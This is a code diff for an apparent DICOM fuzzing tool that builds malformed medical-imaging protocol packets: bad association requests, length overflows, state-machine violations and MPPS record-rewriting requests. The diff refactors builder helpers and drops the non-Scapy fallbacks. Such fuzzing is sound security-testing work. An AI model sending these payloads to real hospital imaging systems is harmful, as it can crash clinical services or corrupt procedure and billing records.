@@ -138,6 +138,9 @@ try:
         MODALITY_WORKLIST_FIND_SOP_CLASS_UID,
         MPPS_SOP_CLASS_UID, STORAGE_COMMITMENT_SOP_CLASS_UID,
         STORAGE_COMMITMENT_SOP_INSTANCE_UID,
+        raw_ae_title, raw_item, raw_presentation_context,
+        raw_user_information, raw_associate_rq_with_items,
+        raw_associate_rq, raw_release_rq,
         _uid_to_bytes,
     )
     SCAPY_DICOM_AVAILABLE = True
@@ -722,15 +725,12 @@ class ProtocolAttacks:
     @staticmethod
     def malformed_protocol_version(version: int = 0xFFFF) -> AttackResult:
         """A-ASSOCIATE-RQ with invalid protocol version."""
-        if not SCAPY_AVAILABLE:
-            payload = b'\x01\x00' + struct.pack('!I', 68) + struct.pack('!H', version) + b'\x00' * 66
-        else:
-            pkt = DICOM() / A_ASSOCIATE_RQ(
-                protocol_version=version,
-                called_ae_title='TARGET',
-                calling_ae_title='ATTACKER',
-            )
-            payload = raw(pkt)
+        pkt = DICOM() / A_ASSOCIATE_RQ(
+            protocol_version=version,
+            called_ae_title='TARGET',
+            calling_ae_title='ATTACKER',
+        )
+        payload = raw(pkt)
         return AttackResult(
             name='malformed_protocol_version',
             category='protocol',
@@ -790,11 +790,8 @@ class ProtocolAttacks:
     @staticmethod
     def truncated_association() -> AttackResult:
         """A-ASSOCIATE-RQ truncated mid-packet."""
-        if not SCAPY_AVAILABLE:
-            full = b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 68
-        else:
-            pkt = DICOM() / A_ASSOCIATE_RQ()
-            full = raw(pkt)
+        pkt = DICOM() / A_ASSOCIATE_RQ()
+        full = raw(pkt)
         payload = full[:len(full) // 2]
         return AttackResult(
             name='truncated_association',
@@ -811,17 +808,14 @@ class ProtocolAttacks:
     @staticmethod
     def pdata_without_association() -> AttackResult:
         """P-DATA-TF sent without prior association."""
-        if not SCAPY_AVAILABLE:
-            payload = b'\x04\x00' + struct.pack('!I', 20) + b'\x00' * 20
-        else:
-            cmd = C_ECHO_RQ(message_id=1)
-            pdv = PresentationDataValueItem(
-                context_id=1,
-                is_last=1, is_command=1,
-                data=raw(cmd),
-            )
-            pkt = DICOM() / P_DATA_TF(pdv_items=[pdv])
-            payload = raw(pkt)
+        cmd = C_ECHO_RQ(message_id=1)
+        pdv = PresentationDataValueItem(
+            context_id=1,
+            is_last=1, is_command=1,
+            data=raw(cmd),
+        )
+        pkt = DICOM() / P_DATA_TF(pdv_items=[pdv])
+        payload = raw(pkt)
         return AttackResult(
             name='pdata_without_association',
             category='protocol',
@@ -837,15 +831,11 @@ class ProtocolAttacks:
     @staticmethod
     def double_association() -> AttackResult:
         """Two A-ASSOCIATE-RQ packets (second should fail)."""
-        if not SCAPY_AVAILABLE:
-            pdu = b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 68
-            pdu1, pdu2 = pdu, pdu
-        else:
-            pkt = DICOM() / A_ASSOCIATE_RQ(
-                called_ae_title='TARGET',
-                calling_ae_title='ATTACKER',
-            )
-            pdu1, pdu2 = raw(pkt), raw(pkt)
+        pkt = DICOM() / A_ASSOCIATE_RQ(
+            called_ae_title='TARGET',
+            calling_ae_title='ATTACKER',
+        )
+        pdu1, pdu2 = raw(pkt), raw(pkt)
         return AttackResult(
             name='double_association',
             category='protocol',
@@ -858,14 +848,11 @@ class ProtocolAttacks:
     @staticmethod
     def overlong_ae_title() -> AttackResult:
         """A-ASSOCIATE-RQ with AE title > 16 chars."""
-        if not SCAPY_AVAILABLE:
-            payload = b'\x01\x00' + struct.pack('!I', 68) + b'X' * 20 + b'\x00' * 48
-        else:
-            pkt = DICOM() / A_ASSOCIATE_RQ(
-                called_ae_title=b'X' * 20,  # Should be max 16
-                calling_ae_title='ATTACKER',
-            )
-            payload = raw(pkt)
+        pkt = DICOM() / A_ASSOCIATE_RQ(
+            called_ae_title=b'X' * 20,  # Should be max 16
+            calling_ae_title='ATTACKER',
+        )
+        payload = raw(pkt)
         return AttackResult(
             name='overlong_ae_title',
             category='protocol',
@@ -882,14 +869,11 @@ class ProtocolAttacks:
     @staticmethod
     def null_ae_titles() -> AttackResult:
         """A-ASSOCIATE-RQ with null AE titles."""
-        if not SCAPY_AVAILABLE:
-            payload = b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 32 + b'\x00' * 36
-        else:
-            pkt = DICOM() / A_ASSOCIATE_RQ(
-                called_ae_title=b'\x00' * 16,
-                calling_ae_title=b'\x00' * 16,
-            )
-            payload = raw(pkt)
+        pkt = DICOM() / A_ASSOCIATE_RQ(
+            called_ae_title=b'\x00' * 16,
+            calling_ae_title=b'\x00' * 16,
+        )
+        payload = raw(pkt)
         return AttackResult(
             name='null_ae_titles',
             category='protocol',
@@ -906,19 +890,16 @@ class ProtocolAttacks:
     @staticmethod
     def missing_application_context() -> AttackResult:
         """A-ASSOCIATE-RQ without Application Context item."""
-        if not SCAPY_AVAILABLE:
-            payload = b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 68
-        else:
-            variable_items = [
-                build_presentation_context_rq(1, VERIFICATION_SOP_CLASS_UID, [DEFAULT_TRANSFER_SYNTAX_UID]),
-                build_user_information(max_pdu_length=16384),
-            ]
-            pkt = DICOM() / A_ASSOCIATE_RQ(
-                called_ae_title='TARGET',
-                calling_ae_title='ATTACKER',
-                variable_items=variable_items,
-            )
-            payload = raw(pkt)
+        variable_items = [
+            build_presentation_context_rq(1, VERIFICATION_SOP_CLASS_UID, [DEFAULT_TRANSFER_SYNTAX_UID]),
+            build_user_information(max_pdu_length=16384),
+        ]
+        pkt = DICOM() / A_ASSOCIATE_RQ(
+            called_ae_title='TARGET',
+            calling_ae_title='ATTACKER',
+            variable_items=variable_items,
+        )
+        payload = raw(pkt)
         return AttackResult(
             name='missing_application_context',
             category='protocol',
@@ -934,13 +915,13 @@ class ProtocolAttacks:
     @staticmethod
     def duplicate_presentation_context_id() -> AttackResult:
         """A-ASSOCIATE-RQ with two Presentation Contexts using the same ID."""
-        variable_items = _item_bytes(0x10, b'1.2.840.10008.3.1.1.1')
-        variable_items += _presentation_context_bytes(
+        variable_items = raw_item(0x10, b'1.2.840.10008.3.1.1.1')
+        variable_items += raw_presentation_context(
             CT_IMAGE_STORAGE_SOP_CLASS_UID, context_id=1)
-        variable_items += _presentation_context_bytes(
+        variable_items += raw_presentation_context(
             MR_IMAGE_STORAGE_SOP_CLASS_UID, context_id=1)
-        variable_items += _user_information_bytes()
-        payload = _associate_rq_with_items('STORESCP', 'C-SCARE-FZ', variable_items)
+        variable_items += raw_user_information()
+        payload = raw_associate_rq_with_items('STORESCP', 'C-SCARE-FZ', variable_items)
         return AttackResult(
             name='duplicate_presentation_context_id',
             category='protocol',
@@ -953,7 +934,7 @@ class ProtocolAttacks:
     @staticmethod
     def even_presentation_context_id() -> AttackResult:
         """A-ASSOCIATE-RQ with even Presentation Context ID."""
-        payload = _associate_rq_bytes(
+        payload = raw_associate_rq(
             'STORESCP', 'C-SCARE-FZ', CT_IMAGE_STORAGE_SOP_CLASS_UID,
             context_id=2)
         return AttackResult(
@@ -969,11 +950,11 @@ class ProtocolAttacks:
     def presentation_context_without_transfer_syntax() -> AttackResult:
         """A-ASSOCIATE-RQ with Abstract Syntax but no Transfer Syntax."""
         pc_payload = bytes([1, 0, 0, 0])
-        pc_payload += _item_bytes(0x30, CT_IMAGE_STORAGE_SOP_CLASS_UID.encode('ascii'))
-        variable_items = _item_bytes(0x10, b'1.2.840.10008.3.1.1.1')
-        variable_items += _item_bytes(0x20, pc_payload)
-        variable_items += _user_information_bytes()
-        payload = _associate_rq_with_items('STORESCP', 'C-SCARE-FZ', variable_items)
+        pc_payload += raw_item(0x30, CT_IMAGE_STORAGE_SOP_CLASS_UID.encode('ascii'))
+        variable_items = raw_item(0x10, b'1.2.840.10008.3.1.1.1')
+        variable_items += raw_item(0x20, pc_payload)
+        variable_items += raw_user_information()
+        payload = raw_associate_rq_with_items('STORESCP', 'C-SCARE-FZ', variable_items)
         return AttackResult(
             name='presentation_context_without_transfer_syntax',
             category='protocol',
@@ -986,8 +967,8 @@ class ProtocolAttacks:
     @staticmethod
     def tiny_max_pdu_length() -> AttackResult:
         """A-ASSOCIATE-RQ negotiates an impractically tiny Max PDU Length."""
-        user_info = _item_bytes(0x51, struct.pack('!I', 1))
-        payload = _associate_rq_bytes(
+        user_info = raw_item(0x51, struct.pack('!I', 1))
+        payload = raw_associate_rq(
             'STORESCP', 'C-SCARE-FZ', CT_IMAGE_STORAGE_SOP_CLASS_UID,
             user_info_payload=user_info)
         return AttackResult(
@@ -1002,11 +983,8 @@ class ProtocolAttacks:
     @staticmethod
     def pdu_length_mismatch(inflate_by: int = 10000) -> AttackResult:
         """A-ASSOCIATE-RQ with length field inflated."""
-        if not SCAPY_AVAILABLE:
-            pdu = b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 68
-        else:
-            pkt = DICOM() / A_ASSOCIATE_RQ()
-            pdu = raw(pkt)
+        pkt = DICOM() / A_ASSOCIATE_RQ()
+        pdu = raw(pkt)
 
         actual_len = struct.unpack('!I', pdu[2:6])[0]
         payload = pdu[:2] + struct.pack('!I', actual_len + inflate_by) + pdu[6:]
@@ -1022,11 +1000,8 @@ class ProtocolAttacks:
     @staticmethod
     def abort_injection() -> AttackResult:
         """A-ABORT packet for injecting mid-session."""
-        if not SCAPY_AVAILABLE:
-            payload = b'\x07\x00' + struct.pack('!I', 4) + b'\x00\x00\x00\x00'
-        else:
-            pkt = DICOM() / A_ABORT(source=0, reason_diag=0)
-            payload = raw(pkt)
+        pkt = DICOM() / A_ABORT(source=0, reason_diag=0)
+        payload = raw(pkt)
         return AttackResult(
             name='abort_injection',
             category='protocol',
@@ -1042,17 +1017,14 @@ class ProtocolAttacks:
     @staticmethod
     def wrong_context_id(context_id: int = 255) -> AttackResult:
         """P-DATA-TF with non-negotiated context ID."""
-        if not SCAPY_AVAILABLE:
-            payload = b'\x04\x00' + struct.pack('!I', 20) + bytes([context_id]) + b'\x00' * 19
-        else:
-            cmd = C_ECHO_RQ(message_id=1)
-            pdv = PresentationDataValueItem(
-                context_id=context_id,
-                is_last=1, is_command=1,
-                data=raw(cmd),
-            )
-            pkt = DICOM() / P_DATA_TF(pdv_items=[pdv])
-            payload = raw(pkt)
+        cmd = C_ECHO_RQ(message_id=1)
+        pdv = PresentationDataValueItem(
+            context_id=context_id,
+            is_last=1, is_command=1,
+            data=raw(cmd),
+        )
+        pkt = DICOM() / P_DATA_TF(pdv_items=[pdv])
+        payload = raw(pkt)
         return AttackResult(
             name='wrong_context_id',
             category='protocol',
@@ -1071,16 +1043,13 @@ class ProtocolAttacks:
         CVE-2024-34508 is covered by the AFLNet net campaign, which mutates
         full DIMSE sessions on the network-receive path.
         """
-        if not SCAPY_AVAILABLE:
-            payload = b''
-        else:
-            cmd = C_STORE_RQ(
-                affected_sop_class_uid=CT_IMAGE_STORAGE_SOP_CLASS_UID,
-                affected_sop_instance_uid='1.2.3.4.5',
-                message_id=1,
-            )
-            cmd.command_field = 0xDEAD  # Invalid!
-            payload = raw(cmd)
+        cmd = C_STORE_RQ(
+            affected_sop_class_uid=CT_IMAGE_STORAGE_SOP_CLASS_UID,
+            affected_sop_instance_uid='1.2.3.4.5',
+            message_id=1,
+        )
+        cmd.command_field = 0xDEAD  # Invalid!
+        payload = raw(cmd)
         return AttackResult(
             name='invalid_command_field',
             category='protocol',
@@ -2328,11 +2297,8 @@ class StateMachineAttacks:
     @staticmethod
     def release_before_assoc() -> AttackResult:
         """A-RELEASE-RQ before association."""
-        if not SCAPY_AVAILABLE:
-            pdu_bytes = b'\x05\x00' + struct.pack('!I', 4) + b'\x00' * 4
-        else:
-            pkt = DICOM() / A_RELEASE_RQ()
-            pdu_bytes = raw(pkt)
+        pkt = DICOM() / A_RELEASE_RQ()
+        pdu_bytes = raw(pkt)
         return AttackResult(
             name='release_before_assoc',
             category='state_machine',
@@ -2365,18 +2331,14 @@ class StateMachineAttacks:
         assoc_result = ProtocolAttacks.double_association()
         assoc_pdu = assoc_result.metadata['steps'][0]
 
-        if not SCAPY_AVAILABLE:
-            release_pdu = b'\x05\x00' + struct.pack('!I', 4) + b'\x00' * 4
-            pdata_pdu = b'\x04\x00' + struct.pack('!I', 20) + b'\x00' * 20
-        else:
-            release_pdu = raw(DICOM() / A_RELEASE_RQ())
-            cmd = C_ECHO_RQ(message_id=1)
-            pdv = PresentationDataValueItem(
-                context_id=1,
-                is_last=1, is_command=1,
-                data=raw(cmd),
-            )
-            pdata_pdu = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))
+        release_pdu = raw(DICOM() / A_RELEASE_RQ())
+        cmd = C_ECHO_RQ(message_id=1)
+        pdv = PresentationDataValueItem(
+            context_id=1,
+            is_last=1, is_command=1,
+            data=raw(cmd),
+        )
+        pdata_pdu = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))
 
         steps = [assoc_pdu, release_pdu, pdata_pdu]
         return AttackResult(
@@ -2394,15 +2356,12 @@ class StateMachineAttacks:
         assoc_result = ProtocolAttacks.double_association()
         assoc_pdu = assoc_result.metadata['steps'][0]
 
-        if SCAPY_AVAILABLE:
-            pdv = PresentationDataValueItem(
-                context_id=1,
-                is_last=0, is_command=0,  # Not last, not command
-                data=b'partial data here',
-            )
-            pdata = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))
-        else:
-            pdata = b'\x04\x00' + struct.pack('!I', 24) + b'\x00\x00\x00\x14\x01\x00' + b'partial data here'
+        pdv = PresentationDataValueItem(
+            context_id=1,
+            is_last=0, is_command=0,  # Not last, not command
+            data=b'partial data here',
+        )
+        pdata = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))
 
         steps = [assoc_pdu, pdata]
         return AttackResult(
@@ -2420,14 +2379,12 @@ class StateMachineAttacks:
 
     @staticmethod
     def _assoc_pdu() -> bytes:
-        return _associate_rq_bytes(
+        return raw_associate_rq(
             'STORESCP', 'C-SCARE-FZ', VERIFICATION_SOP_CLASS_UID)
 
     @staticmethod
     def _echo_pdata(message_id: int = 1, context_id: int = 1,
                     is_last: int = 1, is_command: int = 1) -> bytes:
-        if not SCAPY_AVAILABLE:
-            return b'\x04\x00' + struct.pack('!I', 20) + b'\x00' * 20
         pdv = PresentationDataValueItem(
             context_id=context_id, is_last=is_last, is_command=is_command,
             data=raw(C_ECHO_RQ(message_id=message_id)),
@@ -2436,8 +2393,6 @@ class StateMachineAttacks:
 
     @staticmethod
     def _abort_pdu(source: int = 0, reason: int = 0) -> bytes:
-        if not SCAPY_AVAILABLE:
-            return b'\x07\x00' + struct.pack('!I', 4) + bytes([0, 0, source, reason])
         return raw(DICOM() / A_ABORT(source=source, reason_diag=reason))
 
     @classmethod
@@ -2465,7 +2420,7 @@ class StateMachineAttacks:
     @classmethod
     def pdata_after_release_rp(cls) -> AttackResult:
         """Data after release is complete."""
-        steps = [cls._assoc_pdu(), _release_rq_bytes(), cls._echo_pdata(message_id=2)]
+        steps = [cls._assoc_pdu(), raw_release_rq(), cls._echo_pdata(message_id=2)]
         return AttackResult(
             name='sm_pdata_after_release_rp',
             category='state_machine',
@@ -2486,7 +2441,7 @@ class StateMachineAttacks:
         request release at once and the requestor must wait for A-RELEASE-RP
         while the acceptor's own A-RELEASE-RQ is in flight.
         """
-        steps = [cls._assoc_pdu(), _release_rq_bytes(), _release_rq_bytes()]
+        steps = [cls._assoc_pdu(), raw_release_rq(), raw_release_rq()]
         return AttackResult(
             name='sm_release_collision',
             category='state_machine',
@@ -2510,11 +2465,8 @@ class StateMachineAttacks:
         An SCP that shares one PDU dispatch table between both roles will
         parse an AC it can never legitimately receive.
         """
-        if not SCAPY_AVAILABLE:
-            ac_pdu = b'\x02\x00' + struct.pack('!I', 68) + b'\x00' * 68
-        else:
-            ac_pdu = raw(DICOM() / A_ASSOCIATE_AC(
-                called_ae_title='STORESCP', calling_ae_title='C-SCARE-FZ'))
+        ac_pdu = raw(DICOM() / A_ASSOCIATE_AC(
+            called_ae_title='STORESCP', calling_ae_title='C-SCARE-FZ'))
         steps = [ac_pdu]
         return AttackResult(
             name='sm_associate_ac_from_requestor',
@@ -2531,10 +2483,7 @@ class StateMachineAttacks:
     @classmethod
     def release_rp_from_requestor(cls) -> AttackResult:
         """A-RELEASE-RP sent by the requestor, which only an acceptor may send."""
-        if not SCAPY_AVAILABLE:
-            rp_pdu = b'\x06\x00' + struct.pack('!I', 4) + b'\x00' * 4
-        else:
-            rp_pdu = raw(DICOM() / A_RELEASE_RP())
+        rp_pdu = raw(DICOM() / A_RELEASE_RP())
         steps = [cls._assoc_pdu(), rp_pdu]
         return AttackResult(
             name='sm_release_rp_from_requestor',
@@ -2560,13 +2509,10 @@ class StateMachineAttacks:
         by a data set. A data PDV that arrives first has no command context to
         be interpreted against.
         """
-        if not SCAPY_AVAILABLE:
-            pdata = b'\x04\x00' + struct.pack('!I', 20) + b'\x00' * 20
-        else:
-            ds = _injection_base_dataset()
-            pdv = PresentationDataValueItem(
-                context_id=1, is_last=1, is_command=0, data=ds.encode())
-            pdata = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))
+        ds = _injection_base_dataset()
+        pdv = PresentationDataValueItem(
+            context_id=1, is_last=1, is_command=0, data=ds.encode())
+        pdata = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))
         steps = [cls._assoc_pdu(), pdata]
         return AttackResult(
             name='sm_data_pdv_before_command_pdv',
@@ -2586,17 +2532,13 @@ class StateMachineAttacks:
         Each fragment says more is coming, so a target that buffers until the
         last flag arrives accumulates without bound on a single association.
         """
-        if not SCAPY_AVAILABLE:
-            pdata = b'\x04\x00' + struct.pack('!I', 20) + b'\x00' * 20
-            steps = [cls._assoc_pdu(), pdata, pdata, pdata]
-        else:
-            fragments = []
-            for _ in range(8):
-                pdv = PresentationDataValueItem(
-                    context_id=1, is_last=0, is_command=1,
-                    data=raw(C_ECHO_RQ(message_id=1))[:16])
-                fragments.append(raw(DICOM() / P_DATA_TF(pdv_items=[pdv])))
-            steps = [cls._assoc_pdu()] + fragments
+        fragments = []
+        for _ in range(8):
+            pdv = PresentationDataValueItem(
+                context_id=1, is_last=0, is_command=1,
+                data=raw(C_ECHO_RQ(message_id=1))[:16])
+            fragments.append(raw(DICOM() / P_DATA_TF(pdv_items=[pdv])))
+        steps = [cls._assoc_pdu()] + fragments
         return AttackResult(
             name='sm_unterminated_command_fragment',
             category='state_machine',
@@ -2617,25 +2559,21 @@ class StateMachineAttacks:
         contexts inside a message. A target keying reassembly on the
         connection rather than the context ID will splice them together.
         """
-        if not SCAPY_AVAILABLE:
-            pdata = b'\x04\x00' + struct.pack('!I', 20) + b'\x00' * 20
-            steps = [cls._assoc_pdu(), pdata, pdata]
-        else:
-            first = PresentationDataValueItem(
-                context_id=1, is_last=0, is_command=1,
-                data=raw(C_ECHO_RQ(message_id=1))[:12])
-            other = PresentationDataValueItem(
-                context_id=3, is_last=0, is_command=1,
-                data=raw(C_ECHO_RQ(message_id=2))[:12])
-            tail = PresentationDataValueItem(
-                context_id=1, is_last=1, is_command=1,
-                data=raw(C_ECHO_RQ(message_id=1))[12:])
-            steps = [
-                cls._assoc_pdu(),
-                raw(DICOM() / P_DATA_TF(pdv_items=[first])),
-                raw(DICOM() / P_DATA_TF(pdv_items=[other])),
-                raw(DICOM() / P_DATA_TF(pdv_items=[tail])),
-            ]
+        first = PresentationDataValueItem(
+            context_id=1, is_last=0, is_command=1,
+            data=raw(C_ECHO_RQ(message_id=1))[:12])
+        other = PresentationDataValueItem(
+            context_id=3, is_last=0, is_command=1,
+            data=raw(C_ECHO_RQ(message_id=2))[:12])
+        tail = PresentationDataValueItem(
+            context_id=1, is_last=1, is_command=1,
+            data=raw(C_ECHO_RQ(message_id=1))[12:])
+        steps = [
+            cls._assoc_pdu(),
+            raw(DICOM() / P_DATA_TF(pdv_items=[first])),
+            raw(DICOM() / P_DATA_TF(pdv_items=[other])),
+            raw(DICOM() / P_DATA_TF(pdv_items=[tail])),
+        ]
         return AttackResult(
             name='sm_interleaved_context_ids',
             category='state_machine',
@@ -2673,66 +2611,12 @@ class StateMachineAttacks:
 ICSMA_26_181_01 = 'ICSMA-26-181-01'
 
 
-def _ae_title_bytes(value: str) -> bytes:
-    return value.encode('ascii', 'replace')[:16].ljust(16, b' ')
-
-
-def _item_bytes(item_type: int, payload: bytes) -> bytes:
-    return bytes([item_type, 0]) + struct.pack('!H', len(payload)) + payload
-
-
-def _presentation_context_bytes(abstract_syntax_uid: str,
-                                transfer_syntax_uid: str = DEFAULT_TRANSFER_SYNTAX_UID,
-                                context_id: int = 1) -> bytes:
-    payload = bytes([context_id, 0, 0, 0])
-    payload += _item_bytes(0x30, abstract_syntax_uid.encode('ascii'))
-    payload += _item_bytes(0x40, transfer_syntax_uid.encode('ascii'))
-    return _item_bytes(0x20, payload)
-
-
-def _user_information_bytes(payload: Optional[bytes] = None) -> bytes:
-    if payload is None:
-        payload = _item_bytes(0x51, struct.pack('!I', 16384))
-        payload += _item_bytes(0x52, IMPLEMENTATION_CLASS_UID.encode('ascii'))
-    return _item_bytes(0x50, payload)
-
-
-def _associate_rq_with_items(called_ae: str,
-                             calling_ae: str,
-                             variable_items: bytes) -> bytes:
-    body = b'\x00\x01\x00\x00'
-    body += _ae_title_bytes(called_ae)
-    body += _ae_title_bytes(calling_ae)
-    body += b'\x00' * 32
-    body += variable_items
-    return b'\x01\x00' + struct.pack('!I', len(body)) + body
-
-
-def _associate_rq_bytes(called_ae: str,
-                        calling_ae: str,
-                        abstract_syntax_uid: str,
-                        user_info_payload: Optional[bytes] = None,
-                        context_id: int = 1) -> bytes:
-    variable_items = _item_bytes(
-        0x10, b'1.2.840.10008.3.1.1.1')
-    variable_items += _presentation_context_bytes(
-        abstract_syntax_uid, context_id=context_id)
-    variable_items += _user_information_bytes(user_info_payload)
-    return _associate_rq_with_items(called_ae, calling_ae, variable_items)
-
-
-def _release_rq_bytes() -> bytes:
-    return b'\x05\x00\x00\x00\x00\x04\x00\x00\x00\x00'
 
 
 def _cfind_pdata_bytes(identifier: Dataset,
                        sop_class_uid: str = MODALITY_WORKLIST_FIND_SOP_CLASS_UID,
                        message_id: int = 1) -> bytes:
     identifier_bytes = identifier.encode()
-    if not SCAPY_AVAILABLE:
-        body = b'\x00\x00\x00\x00' + identifier_bytes
-        return b'\x04\x00' + struct.pack('!I', len(body)) + body
-
     cmd = C_FIND_RQ(
         affected_sop_class_uid=sop_class_uid,
         message_id=message_id,
@@ -2761,10 +2645,6 @@ def _cstore_pdata_bytes(dataset: Optional[bytes],
                         data_set_type: int = 0x0000,
                         move_originator_ae_title: Optional[str] = None,
                         move_originator_message_id: Optional[int] = None) -> bytes:
-    if not SCAPY_AVAILABLE:
-        body = b'\x00\x00\x00\x00' + (dataset or b'')
-        return b'\x04\x00' + struct.pack('!I', len(body)) + body
-
     kwargs = {
         'affected_sop_class_uid': sop_class_uid,
         'affected_sop_instance_uid': sop_instance_uid,
@@ -2795,11 +2675,11 @@ def _cstore_pdata_bytes(dataset: Optional[bytes],
 
 
 def _cstore_sequence_bytes(dataset: Optional[bytes], **kwargs) -> Tuple[bytes, List[bytes]]:
-    assoc = _associate_rq_bytes(
+    assoc = raw_associate_rq(
         'STORESCP', 'C-SCARE-FZ',
         kwargs.get('sop_class_uid', SECONDARY_CAPTURE_SOP_CLASS_UID))
     pdata = _cstore_pdata_bytes(dataset, **kwargs)
-    release = _release_rq_bytes()
+    release = raw_release_rq()
     steps = [assoc, pdata, release]
     return b''.join(steps), steps
 
@@ -2861,7 +2741,7 @@ def _user_identity_bytes(identity_type: int,
     body = struct.pack('!BB', identity_type & 0xFF, positive_response & 0xFF)
     body += struct.pack('!H', primary_len & 0xFFFF) + primary
     body += struct.pack('!H', secondary_len & 0xFFFF) + secondary
-    return _item_bytes(_ITEM_USER_IDENTITY_RQ, body)
+    return raw_item(_ITEM_USER_IDENTITY_RQ, body)
 
 
 def _baseline_user_info(extra: bytes) -> bytes:
@@ -2871,15 +2751,15 @@ def _baseline_user_info(extra: bytes) -> bytes:
     sub-item under test: a rejection then means the target rejected *that*
     item, not an otherwise unusable association request.
     """
-    payload = _item_bytes(_ITEM_MAX_LENGTH, struct.pack('!I', 16384))
-    payload += _item_bytes(_ITEM_IMPLEMENTATION_CLASS_UID,
+    payload = raw_item(_ITEM_MAX_LENGTH, struct.pack('!I', 16384))
+    payload += raw_item(_ITEM_IMPLEMENTATION_CLASS_UID,
                            IMPLEMENTATION_CLASS_UID.encode('ascii'))
     return payload + extra
 
 
 def _negotiation_rq(extra_user_info: bytes,
                     abstract_syntax: str = CT_IMAGE_STORAGE_SOP_CLASS_UID) -> bytes:
-    return _associate_rq_bytes(
+    return raw_associate_rq(
         'STORESCP', 'C-SCARE-FZ', abstract_syntax,
         user_info_payload=_baseline_user_info(extra_user_info))
 
@@ -3092,7 +2972,7 @@ class NegotiationAttacks:
         """SOP Class Extended Negotiation with oversized application information."""
         sop = CT_IMAGE_STORAGE_SOP_CLASS_UID.encode('ascii')
         body = struct.pack('!H', len(sop)) + sop + b'\xFF' * size
-        payload = _negotiation_rq(_item_bytes(_ITEM_SOP_EXTENDED_NEGOTIATION, body))
+        payload = _negotiation_rq(raw_item(_ITEM_SOP_EXTENDED_NEGOTIATION, body))
         return AttackResult(
             name='negotiation_extended_oversized_app_info',
             category='negotiation',
@@ -3111,7 +2991,7 @@ class NegotiationAttacks:
         """Extended negotiation SOP Class UID length overruns the sub-item."""
         sop = CT_IMAGE_STORAGE_SOP_CLASS_UID.encode('ascii')
         body = struct.pack('!H', 0xFFFF) + sop + b'\x01'
-        payload = _negotiation_rq(_item_bytes(_ITEM_SOP_EXTENDED_NEGOTIATION, body))
+        payload = _negotiation_rq(raw_item(_ITEM_SOP_EXTENDED_NEGOTIATION, body))
         return AttackResult(
             name='negotiation_extended_uid_length_overrun',
             category='negotiation',
@@ -3132,7 +3012,7 @@ class NegotiationAttacks:
         sop = MR_IMAGE_STORAGE_SOP_CLASS_UID.encode('ascii')
         body = struct.pack('!H', len(sop)) + sop + b'\x01\x01'
         payload = _negotiation_rq(
-            _item_bytes(_ITEM_ROLE_SELECTION, body),
+            raw_item(_ITEM_ROLE_SELECTION, body),
             abstract_syntax=CT_IMAGE_STORAGE_SOP_CLASS_UID)
         return AttackResult(
             name='negotiation_role_selection_unnegotiated_sop_class',
@@ -3152,7 +3032,7 @@ class NegotiationAttacks:
         """Role selection claiming both SCU and SCP roles for one SOP class."""
         sop = CT_IMAGE_STORAGE_SOP_CLASS_UID.encode('ascii')
         body = struct.pack('!H', len(sop)) + sop + b'\x01\x01'
-        payload = _negotiation_rq(_item_bytes(_ITEM_ROLE_SELECTION, body))
+        payload = _negotiation_rq(raw_item(_ITEM_ROLE_SELECTION, body))
         return AttackResult(
             name='negotiation_role_selection_both_roles_set',
             category='negotiation',
@@ -3170,7 +3050,7 @@ class NegotiationAttacks:
     def async_window_zero_operations() -> AttackResult:
         """Asynchronous Operations Window advertising a zero-sized window."""
         body = struct.pack('!HH', 0, 0)
-        payload = _negotiation_rq(_item_bytes(_ITEM_ASYNC_OPERATIONS_WINDOW, body))
+        payload = _negotiation_rq(raw_item(_ITEM_ASYNC_OPERATIONS_WINDOW, body))
         return AttackResult(
             name='negotiation_async_window_zero_operations',
             category='negotiation',
@@ -3255,10 +3135,6 @@ class NegotiationAttacks:
 def _n_pdata_bytes(command_pkt, dataset: Optional[bytes] = None,
                    context_id: int = 1) -> bytes:
     """Wrap a DIMSE-N command (and optional data set) in one P-DATA-TF."""
-    if not SCAPY_AVAILABLE:
-        body = b'\x00\x00\x00\x00' + (dataset or b'')
-        return b'\x04\x00' + struct.pack('!I', len(body)) + body
-
     pdv_items = [PresentationDataValueItem(
         context_id=context_id, is_last=1, is_command=1, data=raw(command_pkt),
     )]
@@ -3274,9 +3150,9 @@ def _n_service_sequence(command_pkt,
                         dataset: Optional[bytes] = None,
                         called_ae: str = 'MPPSSCP') -> Tuple[bytes, List[bytes]]:
     """A-ASSOCIATE-RQ || DIMSE-N P-DATA-TF || A-RELEASE-RQ."""
-    assoc = _associate_rq_bytes(called_ae, 'C-SCARE-FZ', sop_class_uid)
+    assoc = raw_associate_rq(called_ae, 'C-SCARE-FZ', sop_class_uid)
     pdata = _n_pdata_bytes(command_pkt, dataset)
-    release = _release_rq_bytes()
+    release = raw_release_rq()
     steps = [assoc, pdata, release]
     return b''.join(steps), steps
 
@@ -3333,8 +3209,6 @@ class DimseNAttacks:
         that trusts Command Data Set Type reaches its attribute lookup with
         nothing behind it.
         """
-        if not SCAPY_AVAILABLE:
-            return cls._unavailable('mpps_ncreate_dataset_flag_without_data')
         cmd = N_CREATE_RQ(
             affected_sop_class_uid=MPPS_SOP_CLASS_UID,
             message_id=1,
@@ -3358,8 +3232,6 @@ class DimseNAttacks:
     @classmethod
     def mpps_nset_unknown_instance(cls) -> AttackResult:
         """N-SET against an MPPS instance that was never created."""
-        if not SCAPY_AVAILABLE:
-            return cls._unavailable('mpps_nset_unknown_instance')
         cmd = N_SET_RQ(
             requested_sop_class_uid=MPPS_SOP_CLASS_UID,
             message_id=2,
@@ -3390,8 +3262,6 @@ class DimseNAttacks:
         reopened lets a caller rewrite the performed-procedure record that
         billing and audit read from.
         """
-        if not SCAPY_AVAILABLE:
-            return cls._unavailable('mpps_nset_reopen_completed_step')
         cmd = N_SET_RQ(
             requested_sop_class_uid=MPPS_SOP_CLASS_UID,
             message_id=3,
@@ -3418,8 +3288,6 @@ class DimseNAttacks:
     @classmethod
     def mpps_nset_final_state_undefined_value(cls) -> AttackResult:
         """N-SET with a Performed Procedure Step Status outside the enum."""
